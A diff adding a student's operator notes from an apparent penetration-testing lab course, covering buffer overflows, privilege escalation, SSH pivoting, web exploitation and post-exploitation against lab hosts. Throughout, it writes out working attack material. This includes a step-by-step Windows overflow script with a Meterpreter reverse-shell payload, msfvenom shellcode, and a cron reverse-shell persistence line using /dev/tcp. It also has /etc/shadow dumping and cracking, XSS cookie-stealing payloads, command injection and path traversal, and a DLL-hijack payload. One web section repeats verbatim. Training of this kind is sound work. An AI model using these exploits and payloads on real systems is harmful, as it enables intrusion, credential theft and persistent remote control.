@@ -1,0 +1,649 @@
+####################BUFFER OVERFLOW ##################
+
+grayhost: 10.50.35.125
+T1
+Hostname: Donovian_Webserver
+IP: 192.168.28.111
+OS: CentOS
+Creds: comrade :: StudentWebExploitPassword
+Last Known SSH Port: 2222
+Action: Exploit binary.
+
+get the executable onto your linops
+chmod +x inventory.exe
+./inventory.exe
+interact with
+overflow with characters
+segmentation fault (core dumped)
+gdb peda
+file inventory.exe
+run
+wiremask.eu
+copy from wiremask and past into the executable being run
+copy the offset
+0x63413563 #EIP OFFSET
+paste into wireshark.eu the offset
+offset = 76
+create script linuxchallengeoverflow.py
+on gbd-peda: run <<< $(python /home/student/Downloads/inventory.exe
+need to now find a valid JMP
+gdb - env
+show env
+unset env LINES
+unset env COLUMNS
+show env
+file func #to load up func
+run
+send all aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+info proc map
+find /b 0xf7de1000, 0xf7ffe000, 0xff, 0xe4
+0xf7f655cf
+0xf7f65777
+0xf7f659ef
+0xf7f662eb
+0xf7f6649b
+0xf7f66533
+msfvenom -p linux/x86/exec CMD="whoami" -b "\x00" -f python
+buf =  b""
+buf += b"\xda\xdd\xd9\x74\x24\xf4\xba\xf6\x39\x47\xc9\x5b\x31"
+buf += b"\xc9\xb1\x0b\x31\x53\x19\x03\x53\x19\x83\xc3\x04\x14"
+buf += b"\xcc\x2d\xc2\x80\xb6\xe0\xb2\x58\xe4\x67\xb2\x7f\x9e"
+buf += b"\x48\xb7\x17\x5f\xff\x18\x85\x36\x91\xef\xaa\x9b\x85"
+buf += b"\xf7\x2c\x1c\x56\x8f\x44\x73\x37\x02\xfd\x8b\xe0\x8f"
+buf += b"\x74\x6a\xc3\xb0"
+back on linops ./inventory.exe <<< $(python /home/student/Downloads/linuxchallengeoverflow.py)
+
+went to comrade, obtained a new EIP with the command cat /.secret/.verysecret.pdb/ on the comrade machine
+obtained a new buf on the comrade machine
+sudo ./inventory.exe <<< $(python /home/comrade/linuxchallengeoverflow.py)
+answer complete
+
+
+#################### LIN PRIV ESC #################################
+grayhost: ssh 10.50.35.125
+
+student recon password
+
+find / -type f -perm /4000 -ls 2>/dev/null
+
+ssh onto the target 1 and 2 machines
+in the /var/tmp and the /tmp directory, add a script for doing an ls. results will output to the /tmp directory as a file called dir.txt
+----------------------------------------------------------------------------------
+#!/bin/bash
+
+ls -lisa ~ > dir.txt
+--------------------------------------------------------------------------------------
+this will run a command during billybobs script to have him /bin/ls his directory and send an output of it to my own directory
+now edit script to do what i want
+10-million-password-list-top-10000.txt
+f!@g1.txt
+i want to /bin/cat file output to a new file, Build upon the previous commands
+--------------------------------------------------------------------------------------------------
+#!/bin/bash
+/bin/ls -lisa ~; /bin/cat /home/billybob/10-million-password-list-top-10000.txt > 10-mill.txt
+/bin/ls -lisa ~; /bin/cat /home/billybob/f!@g1.txt > flag.txt
+-----------------------------------------------------------------------------------
+#!/bin/bash
+
+sudo /bin/cat /etc/shadow > shadow.txt
+--------------------------------------------------------------------------------------
+scp the 10-mil, shadow and passwd to linops. run john the ripper on the file  on linops
+scp 10-mill.txt student@10.50.34.188:/home/student/hashedout/
+ghjcnbnenrf for zeus
+su root
+cd /root
+flag
+set up reverse shell persistance in cron jobs every minutes
+put this command in the /etc/cron.d/mdadm script at the bottom
+* * * * * root /bin/bash -c '/bin/bash -i >& /dev/tcp/192.168.28.135/33403 0>&1'
+look for answer in /tmp
+
+check etc hosts for things
+sudo -l comes from /etc/sudoers
+./unknown /etc/sudoers 'comrade ALL=(ALL:ALL) ALL'
+sudo cat /etc/shadow
+sudo cat /etc/passwd
+john the ripper
+john --wordlist=10-mill.txt pass.txt
+do not do previous steps above, root has no password lol
+sudo su root
+
+################## POST EXP NOTES ####################################
+
+Gray Host: 10.50.35.125
+linux_ops
+192.168.65.20, 10.50.34.188
+win_ops 	
+192.168.65.10, 10.50.39.83  
+Scheme of Maneuver:
+>internet_grey_host
+->T1: 192.168.28.100 ALT PORT 2222
+--->T3:x.x.x.9
+
+Target Section:
+
+T1
+Hostname: Donovian_Extranet
+IP: 192.168.28.100
+OS: CentOS
+Creds: comrade :: StudentMidwayPassword
+Last Known SSH Port: 2222
+PSP: none
+Malware: none
+Action: Perform SSH masquerade and survey system. Identify redirection to the next target.
+
+T3
+Hostname: unknown
+IP: x.x.x.9
+OS: unknown
+Creds:unknown
+Last Known SSH Port: unknown
+PSP: Unknown
+Malware: Unknown
+Action: Gain access; survey host and map Donovian internal Cyberspace.
+
+create a tunnel to .100
+10300 is access to the .100
+set up dynamic to .100
+nmap .100 networks / pingsweep
+
+192.168.28.12
+22
+
+192.168.28.27
+22
+
+cd into Desktop/Network on extranet
+contains map.png
+scp -P 10300 comrade@localhost:/home/comrade/Dekstop/network/map.png .
+INTERNAL NETWORK 192.168.X.0/27
+looked into /etc/hosts
+saw 192.168.150.253
+run nmap on this ip
+	80
+	514
+	3201 (alt-ssh)
+ssh from comrade to 150.253
+ssh tunnel to the port 80 on the 150.253
+port 10301
+	the website contains information on APACHE2 ubuntu
+create a tunnel to port 3201 for access to .150.253
+student@lin-ops:~$ ssh comrade@localhost -p 10300 -L 10302:192.168.150.253:3201 -NT
+dynamic tunnel to 150.253
+ssh comrade@localhost -p 10302
+lin.intranet.donovia
+ip n
+	.227
+	.226
+	.225
+cat /etc/hosts
+cat /etc/shadow
+cat /etc/passwd
+192.168.56.1 ?
+192.168.215.128:8080 
+192.168.56.1 port 8080 is bad guy shell @badguy:514 
+192.168.28.135
+Oct 11 13:00:01 lin CRON[12919]: (root) CMD (/bin/bash echo '#Fl@g = 1FeBNAs7iD9VRNPvxzbP' >> /var/log/auth.log) #possible priv escalation
+sudo su root #escalated comrade to root
+notice 185.125.190.57:123 in syslog
+noticed robots.txt in the apache2 logs
+cd /etc/ryslog.d
+cat the files for answer
+cd /root
+cat /brootkit/brootkit-master/br.conf
+contained a remote ip 192.168.215.128 with remote ports 8080, 8899?
+cat /etc/rkhunter.conf
+cat /brootkit/brootkit/bashtn.sh #contains telnet localhost 8080
+192.168.215.12:http-alt ?
+tcpdump for the beacon
+tcp dump with src as my own ip address and focus on the port 514. filter out ssh traffic.
+proxychains sudo tcpdump -XXvvnnS dst 192.168.150.253 and not port 3201
+found weird ports 
+set up a netcat listener to find what the beacon is sending out
+look in the binaries for the nc commands and chmod the binary they point too
+run the binary of the netcat on the ip and port
+
+intranet
+192.168.28.9 target
+
+nmap for ports
+on lin run the ip route command
+192.168.150.224/27
+192.168.150.245
+	135
+	139
+	445
+rdp onto the 28.9
+
+
+#################### RECON OPS ###########################
+OPNOTES
+
+for i in {1..254}; do (ping -c 1 192.168.1.$i | grep "bytes from" &); done #ran from machine closest to the network I want to scan
+nmap -Pn -T4 <ip> -p 21-25,80,8080,8888,2222,4444
+
+create a Dynamic tunnel from Linops to 10.50.35.125 network
+ssh 10.50.35.125 -D 9050 -NT
+
+ping sweep 192.168.28.96/27 network
+proxychains nmap the network hosts for ports 21-25,80,8080,8888,2222,4444
+192.168.28.100
+	2222/tcp open EtherNetIP-1 (alt-ssh)
+192.168.28.105
+	21/tcp ftp
+	23/tcp telnet
+	2222/tcp EtherNetIP-1 (alt-ssh)
+192.168.28.111
+	80/tcp open http #consulting.site.donovia port 80
+	2222/tcp open EtherNetIP-1 (alt-ssh)
+	8080/tcp open http-proxy #conference.site.donovia port 80
+ping sweep 192.168.150.224/27 network
+	Nothing to note at this time
+
+netcat all available open ports on networks
+
+pull files from available ftp ports
+proxychains nc 192.168.28.105 21 -> files pulled
+file: ServerInitializations
+	-PassTemporary
+	-loginfirst
+	-logout null bit
+	-houseBeatFliesLOW
+	-YourTempPassword
+
+
+create tunnels to the open http ports on the .111 network
+ssh 10.50.35.125 -L 10300:192.168.28.111:80 -NT
+ssh 10.50.35.125 -L 10301:192.168.28.111:8080 -NT
+
+go to firefox from linops
+input ip and specific http port
+
+edit script to input correct information from page element into script for pulling html information to find flags
+scrape.py
+
+scan 192.168.28.96 network for Higher Unknown Ports
+
+192.168.28.120
+	4242/tcp open vrml-multi-use(alt-ssh)
+
+nc port 192.168.28.120 4242
+
+login to 192.168.28.120 -p 4242 with password YourTempPassword recovered from file pulled on 192.168.28.105 host
+
+ssh into 192.168.28.120
+
+ip n for neighbors connected to .120
+
+.98 .99 both have port 53 open
+.97 nothing at this time
+
+create an ssh tunnel to .120 network
+ssh localhost -p 10302 -D 9050 -NT
+set up dynamic tunnel to .120 network
+ssh localhost -p 10302 -D 9050 -NT
+
+scan .120/27 network for hosts and open ports
+proxychains nmap
+look at time to live with pingsweep on the .120 for the 192.168.150 network
+192.168.28.245
+contains ttl of 127 meaning these are most likely windows machines
+run proxychains nmap -Pn -T4 192.168.150.245 --script=smb-os-discovery.nse -p 445
+
+go to 0.0.0.0:8080 and inspect element
+look for information in regards to title
+ 
+ 
+ ################# SQL INJECTION  OP NOTES ###############
+ set up dynamic tunnel to pivot
+ssh 10.50.35.125 -D 9050 -NT 
+
+proxychains nmap T1 10.100.28.40 for open ports
+10.100.28.40
+	80 http
+	4444 krb524(alt-ssh)
+	
+netcat ports to confirm
+ssh onto pivot
+attempt ssh onto T1 through alt-ssh 4444
+password unknowon
+
+ssh tunnel pivot to T1 for port 80
+
+ssh 10.50.35.125 -L 10400:10.100.28.40:80 -NT
+
+open firefox on linops
+connect to 10.100.28.40:80
+
+proxychains nmap -Pn -T4 10.100.28.40 -p 80 --script=http-enum.nse #for additional info
+robots.txt
+	User-agent: *
+	Disallow: /net_test #important
+/css/ potential
+/images/ potential
+/uploads/ potential
+/TT/ticket.php 
+/uploads/message contains an ip 10.100.28.55 #noted
+
+
+<script>alert('XSS');</script> into the ticket.php
+<script>alert("XSS");</script>
+nothing occured
+
+python3 -m http.server
+<script>/home/student/cookies="http://10.50.39.188:8000/"+document.cookie;</script>
+uploaded cookiefile.txt
+#Not sure if i need this?#
+
+upload cookiefile.txt
+upload local cooking stealing script
+<script>document.location="http://10.100.28.40/uploads/cookie_stealer.php?username="+document.cookie;</script>
+this works
+
+on net_test, ;whoami, ;ls -la /home/billybob/, ;mkdir /home/billybob/.ssh
+on linops generate rsa key
+ssh-keygen -t rsa -b 4096
+cat id_rsa.pub 
+copy key
+on billybob echo public key into .ssh/authorized_keys
+
+on linops create a tunnel to 10.100.28.40
+ssh 10.50.35.125 -L 10401:10.100.28.40:4444 -NT #to login as billybob
+ssh billybob@localhost -p 10401 
+
+make dynamic tunnel to billybob
+create a tunnel to .50 port 80
+go to website for .50 port 80 with new highport made
+
+
+PHP CHALLENGES#############################################################
+on billybob
+run pingsweep
+10.100.28.33 .34 .35 .40 .48 .55
+nmap these ip addresses for open ports
+10.100.28.48 #conference and consulting questions
+	80 http
+	4444(alt-ssh)
+--script=http-enum.nse
+	/css/
+	/images/
+	/includes/
+	/js/
+	/scripts/
+10.100.28.55 was noted earlier as important. scan this ip for larger ports.
+
+ssh billybob@localhost -p 10401 -L 10402:10.100.28.55:80 -NT
+go to website
+open developer tool on last page
+run the function called win_the_game()
+interactive with environment
+
+interactive with the webpage
+directory traversal
+http://0.0.0.0:10402/books_pick.php?book=../../../../../etc/passwd
+
+
+############## WEB EXPLOIT  OP NOTES #########################
+set up dynamic tunnel to pivot
+ssh 10.50.35.125 -D 9050 -NT 
+
+proxychains nmap T1 10.100.28.40 for open ports
+10.100.28.40
+	80 http
+	4444 krb524(alt-ssh)
+	
+netcat ports to confirm
+ssh onto pivot
+attempt ssh onto T1 through alt-ssh 4444
+password unknowon
+
+ssh tunnel pivot to T1 for port 80
+
+ssh 10.50.35.125 -L 10400:10.100.28.40:80 -NT
+
+open firefox on linops
+connect to 10.100.28.40:80
+
+proxychains nmap -Pn -T4 10.100.28.40 -p 80 --script=http-enum.nse #for additional info
+robots.txt
+	User-agent: *
+	Disallow: /net_test #important
+/css/ potential
+/images/ potential
+/uploads/ potential
+/TT/ticket.php 
+/uploads/message contains an ip 10.100.28.55 #noted
+
+
+<script>alert('XSS');</script> into the ticket.php
+<script>alert("XSS");</script>
+nothing occured
+
+python3 -m http.server
+<script>/home/student/cookies="http://10.50.39.188:8000/"+document.cookie;</script>
+uploaded cookiefile.txt
+#Not sure if i need this?#
+
+upload cookiefile.txt
+upload local cooking stealing script
+<script>document.location="http://10.100.28.40/uploads/cookie_stealer.php?username="+document.cookie;</script>
+this works
+
+on net_test, ;whoami, ;ls -la /home/billybob/, ;mkdir /home/billybob/.ssh
+on linops generate rsa key
+ssh-keygen -t rsa -b 4096
+cat id_rsa.pub 
+copy key
+on billybob echo public key into .ssh/authorized_keys
+
+on linops create a tunnel to 10.100.28.40
+ssh 10.50.35.125 -L 10401:10.100.28.40:4444 -NT #to login as billybob
+ssh billybob@localhost -p 10401 
+
+make dynamic tunnel to billybob
+create a tunnel to .50 port 80
+go to website for .50 port 80 with new highport made
+
+
+PHP CHALLENGES#############################################################
+on billybob
+run pingsweep
+10.100.28.33 .34 .35 .40 .48 .55
+nmap these ip addresses for open ports
+10.100.28.48 #conference and consulting questions
+	80 http
+	4444(alt-ssh)
+--script=http-enum.nse
+	/css/
+	/images/
+	/includes/
+	/js/
+	/scripts/
+10.100.28.55 was noted earlier as important. scan this ip for larger ports.
+
+ssh billybob@localhost -p 10401 -L 10402:10.100.28.55:80 -NT
+go to website
+open developer tool on last page
+run the function called win_the_game()
+interactive with environment
+
+interactive with the webpage
+directory traversal
+http://0.0.0.0:10402/books_pick.php?book=../../../../../etc/passwd
+
+ ### WIN BUFFER OVERFLOW  ####################
+ 192.168.150.245  is the target for remote exploit
+10300 tunnel to grayhost
+10302 tunnel to 192.168.28.120 (grey-site-donovia-06) ssh 4242
+dynamic tunnel to 10302
+ssh localhost -p 10302 -D 9050 -NT
+proxychains nmap 192.168.150.245
+135
+139
+445
+3389
+9999 #welcome to SecureSever
+nc 192.168.150.245 9999
+
+send the essfunc.dll and secureserver.exe to the winops 
+execute the .exe and see how it works
+open .exe in immunitydebugger
+debug
+run
+look at the cpu registers screen
+build exploit; vim winhack.py
+##
+import socket
+offset = "TRUN /.:/"
+offset += "A" * 5000
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect(('10.50.23.152', 9999))
+print s.recv(1024)
+s.send(offset)
+s.close()
+##
+go to wiremask.eu and enter 5000 length and copy the pattern of 5000 character string
+##
+import socket
+offset = "TRUN /.:/"
+offset += 'paste the 5000 character string'
+# offset += "A" * 5000
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect(('10.50.23.152', 9999))
+print s.recv(1024)
+s.send(offset)
+s.close()
+##
+test the script on linops by typing; python winhack.py
+copy eip from immunity debugger
+put eip into wiremask.eu register value offset. obtain offset number of 2003
+press back button on immunity debugger alot to reset it
+##
+import socket
+offset = "TRUN /.:/"
+offset += "A" * 2003 #change the offset to what we discovered
+eip = "B" * 4
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect(('10.50.23.152', 9999))
+print s.recv(1024)
+s.send(offset + eip)
+s.close()
+##
+go back to linops and run the script
+look at the immunity debugger and view the eip changed to 42424242
+in immunity debugger use MONA
+!mona jmp -r ESP -m "essfunc.dll"
+grab the first hex 
+##
+import socket
+offset = "TRUN /.:/"
+offset += "A" * 2003 #change the offset to what we discovered
+eip = "\xa0\x12\x50\x62" #in reverse endian order
+nop = "\x90" * 10
+#eip = "B" * 4
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect(('10.50.23.152', 9999))
+print s.recv(1024)
+s.send(offset + eip + nop)
+s.close()
+##
+create shellcode
+on linops msfvenom -p windows/meterpreter/reverse_tcp lhost=10.50.34.188 lport=5555 -b '\x00' -f python
+run it
+copy the payload of all of the buffs
+##
+import socket
+offset = "TRUN /.:/"
+offset += "A" * 2003 #change the offset to what we discovered
+#### msfvenom -p windows/meterpreter/reverse_tcp lhost=10.50.34.188 lport=5555 -b '\x00' -f python ####
+buf += b"\x3a\........"
+buf += b......
+eip = "\xa0\x12\x50\x62" #in reverse endian order
+nop = "\x90" * 10
+#eip = "B" * 4
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect(('10.50.23.152', 9999))
+print s.recv(1024)
+s.send(offset + eip + nop + buff)
+s.close()
+##
+on linops type msfconsole
+need to set up a multi handler
+command: use multi/handler
+show options 
+set payload windows/meterpreter/reverse_tcp
+show options
+set lhost 0.0.0.0c
+set lport 5555
+command: exploit
+# the exploit is now listening on port 5555 #
+when ready to actually test exploit, exit debugger and run the .exe
+on linops run the script as python winhack.py
+this gives a meterpreter shell
+type shell to get into the shell
+inside of the script, change the ip to the loopback and port used to tunnel to the target
+	for who you wish to send hack into next
+######## another possible exploit to use
+msfvenom -p windows/shell_reverse_tcp
+
+ ########### WIN PRIV ESC OP NOTES ###########################
+ gray host 10.50.35.125
+pivot: ssh comrade@192.168.28.105 -p 2222 StudentReconPassword
+xfreerdp /v:192.168.28.5 /u:comrade /p:StudentPrivPassword /size:1920x1000 +clipboard
+
+T1
+Hostname: donovian-windows-private
+IP: 192.168.28.5
+OS: Windows ver: Unknown
+Creds: comrade :: StudentPrivPassword
+Last Known Ports: 3389
+PSP: unknown
+Malware: unknown
+
+ssh 10.50.35.125 -L 10300:0.0.0.0:22 -NT
+ssh 0.0.0.0 -p 10300 -L 10301:192.168.28.105:2222 -NT
+ssh comrade@0.0.0.0 -p 10301 -D 9050 -NT
+nmap 192.168.28.5 for open ports
+	135/tcp  open  msrpc
+	139/tcp  open  netbios-ssn
+	445/tcp  open  microsoft-ds
+	3389/tcp open  ms-wbt-server
+	5040/tcp open  unknown
+	5985/tcp open  wsman
+	5986/tcp open  wsmans
+	47001/tcp open  winrm
+ssh comrade@0.0.0.0 -p 10301 -L 10302:192.168.28.5:3389 -NT
+xfreerdp /v:0000:10302 /u:comrade /p:StudentPrivPassword /size:1920x1000 +clipboard
+
+services app
+description
+Memory status contains none
+icacls "C:\MemoryStatus\service.exe"
+RX for builtin\users:(I)(RX)
+
+xfreerdp /v:0000:10302 /u:comrade /p:StudentPrivPassword /size:1920x1000 +clipboard
+
+msfvenom -p windows/exec CMD='cmd.exe /C "type C:\Users\Admin\Desktop\flag.txt" > C:\\Users\\comrade.WIN2-INTERNAL-D\\Desktop\\flag.txt' -f dll > hijackmeplz.dll
+
+
+####### COMMANDS FOR PRRP #################
+#!/usr/bin/python
+
+### Imports ###
+import lxml.html
+import requests
+
+### Grabs the webpage ###
+page = requests.get('http://0.0.0.0:10300/index.html')
+tree = lxml.html.fromstring(page.content)
+
+### Outlines the tag you want to grab ###
+# Change //small[..] to whatever tag. Leave /text() as is
+answers = tree.xpath('//dd[@class="org-title"]/text()')
+
+### Print it out ###
+print ('answers: ',answers)
+
+------------------------------------------------------------------------------
+Ping Sweep
+for i in {1..254} ;do (ping -c 1 192.168.1.$i | grep "bytes from" &) ;done
